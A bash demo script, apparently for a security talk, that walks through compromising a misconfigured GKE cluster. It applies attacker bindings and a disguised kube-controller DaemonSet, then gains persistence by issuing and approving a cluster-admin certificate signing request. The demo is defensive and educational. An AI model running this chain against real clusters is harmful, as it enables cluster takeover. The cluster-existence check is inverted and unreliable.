#!/bin/bash

set -o errexit
set -o nounset
set -o pipefail

### Setup ###

export VULN_CLUSTER_NAME="gke-customer-cluster"
export VULN_CLUSTER_VERSION="1.27.3-gke.100"
export PROJECT="vinaygo-gke-dev"
export ZONE="us-central1-c"

DEMOMAGIC="demo-magic.sh"

if [ ! -f $DEMOMAGIC ]; then
  curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
  chmod a+x demo-magic.sh
fi

. ./demo-magic.sh
# TODO(vinayakankugoyal): set this before demo..
TYPE_SPEED=""
#DEMO_PROMPT="compromised_node# "
# Turns out the white defined in demo-magic renders a little grey.
DEMO_CMD_COLOR=$BOLD
clear
echo ""
echo ""

EXIST=$(gcloud container clusters list --format json | jq '.[] | select(.name == "gke-customer-cluster") | .name')

if [ $EXIST = "gke-customer-cluster" ];
then
    gcloud container clusters create --project $PROJECT \
    --cluster-version $VULN_CLUSTER_VERSION \
    --location $ZONE \
    $VULN_CLUSTER_NAME &> /dev/null
fi

gcloud container clusters get-credentials $VULN_CLUSTER_NAME \
--project $PROJECT \
--location $ZONE &> /dev/null

### DEMO ###

clear

echo ""

echo ""

DEMO_PROMPT="customer-cluster $ "

pe "cat customer_binding.yaml"

echo ""
echo ""

pe "kubectl apply -f customer_binding.yaml"

echo ""
echo ""

wait

clear

DEMO_PROMPT="attacker-machine $ "

echo "scanning..."
echo "scanning..."
echo "scanning..."

wait

echo "target found!"

wait

clear

pe "cat attacker_foothold_binding.yaml"

echo ""
echo ""


pe "kubectl apply -f attacker_foothold_binding.yaml"

echo ""
echo ""


p "cat attacker_foothold_daemonset.yaml"

cat attacker_foothold_daemonset_for_show.yaml

echo ""
echo ""

pe "kubectl apply -f attacker_foothold_daemonset.yaml"

echo ""
echo ""

wait

clear

DEMO_PROMPT="kube-controller-daemonset $ "

openssl genrsa -out csr.key 2048

openssl req -new -key csr.key -out csr.csr -subj "/CN=cluster-admin"

ENCODED=$(cat csr.csr | base64 | tr -d "\n")

sed -e "s/{{request}}/$ENCODED/g" attacker_persistence_csr.tmpl > attacker_persistence_csr.yaml

pe "cat attacker_persistence_csr.yaml"

echo ""
echo ""

pe "kubectl apply -f attacker_persistence_csr.yaml"

echo ""
echo ""

pe "kubectl get csr cluster-admin -o jsonpath='{.spec.request}' | base64 -d | openssl req -subject -noout"

echo ""
echo ""

sleep 10

pe "kubectl certificate approve cluster-admin"

echo ""
echo ""

sleep 10

pe "kubectl get csr cluster-admin -o jsonpath='{.status.certificate}' | base64 -d | openssl x509 -subject -noout"

kubectl get csr cluster-admin -o jsonpath='{.status.certificate}' | base64 -d > csr.crt

echo ""
echo ""

pe "cat attacker_persistence_binding.yaml"

echo ""
echo ""

pe "kubectl apply -f attacker_persistence_binding.yaml"

echo ""
echo ""

wait

clear

DEMO_PROMPT="attacker-machine $ "

pe "kubectl auth can-i --list --client-key csr.key --client-certificate csr.crt"

wait

### Cleanup ###

rm csr.key csr.crt csr.csr attacker_persistence_csr.yaml &> /dev/null
kubectl delete --wait=false clusterrolebinding cluster-system-anonymous kube-controller-manager kube-controller-admin &> /dev/null
kubectl delete --wait=false ds kube-controller &> /dev/null
kubectl delete --wait=false csr cluster-admin &> /dev/null
